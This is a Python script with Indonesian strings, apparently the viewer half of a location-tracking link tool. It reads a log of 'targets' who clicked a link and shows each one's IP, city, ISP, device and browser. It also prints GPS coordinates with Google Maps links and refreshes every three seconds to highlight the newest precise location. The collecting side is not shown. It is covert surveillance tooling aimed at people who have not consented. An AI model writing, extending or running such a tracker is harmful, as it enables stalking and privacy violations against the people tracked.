import json
import os
import time
import subprocess
from datetime import datetime

LOG_FILE = "logs.txt"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def get_location_link(lat, lon):
    return f"https://www.google.com/maps?q={lat},{lon}"

def format_timestamp(ts):
    try:
        dt = datetime.fromisoformat(ts)
        return dt.strftime('%d/%m/%Y %H:%M:%S')
    except:
        return ts

def display_data():
    clear_screen()
    print("="*70)
    print("  🎯 TRACKER VIEWER - REAL TIME DATA")
    print("="*70)
    
    if not os.path.exists(LOG_FILE):
        print("\n[!] Belum ada data. Tunggu target klik link...")
        return
    
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()
    
    if not lines:
        print("\n[!] File kosong.")
        return
    
    # Ambil data terakhir (paling baru)
    data_list = []
    for line in lines:
        try:
            data_list.append(json.loads(line))
        except:
            continue
    
    if not data_list:
        print("\n[!] Tidak ada data valid.")
        return
    
    # Tampilkan SEMUA data
    print(f"\n📊 TOTAL DATA: {len(data_list)} entries\n")
    print("-"*70)
    
    for idx, data in enumerate(data_list, 1):
        lokasi = data.get('lokasi', {})
        ip = data.get('ip', 'Unknown')
        negara = lokasi.get('negara', '-')
        kota = lokasi.get('kota', '-')
        provinsi = lokasi.get('provinsi', '-')
        lat = lokasi.get('latitude', 0)
        lon = lokasi.get('longitude', 0)
        isp = lokasi.get('isp', '-')
        akurasi = lokasi.get('akurasi', 'IP-based')
        device = data.get('browser', 'Unknown') + ' / ' + data.get('os', 'Unknown')
        timestamp = data.get('timestamp', '')
        ua = data.get('user_agent', 'Unknown')
        
        # Tandai yang punya GPS
        gps_tag = "📍 GPS" if akurasi == "GPS (sangat akurat)" else "🌐 IP"
        
        print(f"[{idx}] {gps_tag} | {format_timestamp(timestamp)}")
        print(f"    IP: {ip}")
        print(f"    Lokasi: {kota}, {provinsi}, {negara}")
        print(f"    Koordinat: {lat}, {lon}")
        print(f"    ISP: {isp}")
        print(f"    Device: {device}")
        print(f"    Akurasi: {akurasi}")
        
        if lat != 0 and lon != 0:
            maps_link = get_location_link(lat, lon)
            print(f"    🗺️  Maps: {maps_link}")
        
        print("    " + "-"*50)
    
    # Highlight data GPS terbaik
    gps_data = [d for d in data_list if d.get('lokasi', {}).get('akurasi') == 'GPS (sangat akurat)']
    if gps_data:
        latest = gps_data[-1]
        lat = latest['lokasi']['latitude']
        lon = latest['lokasi']['longitude']
        print("\n" + "="*70)
        print(f"🎯 TARGET TERBARU (GPS AKURAT!)")
        print(f"   Koordinat: {lat}, {lon}")
        print(f"   Maps: https://www.google.com/maps?q={lat},{lon}")
        print(f"   Waktu: {format_timestamp(latest['timestamp'])}")
        print("="*70)

def auto_refresh():
    """Auto refresh setiap 3 detik"""
    try:
        while True:
            display_data()
            time.sleep(3)
    except KeyboardInterrupt:
        print("\n\n[!] Viewer dihentikan.")
        exit()

if __name__ == '__main__':
    print("\n🔄 Auto-refresh setiap 3 detik... (CTRL+C untuk stop)")
    time.sleep(1)
    auto_refresh()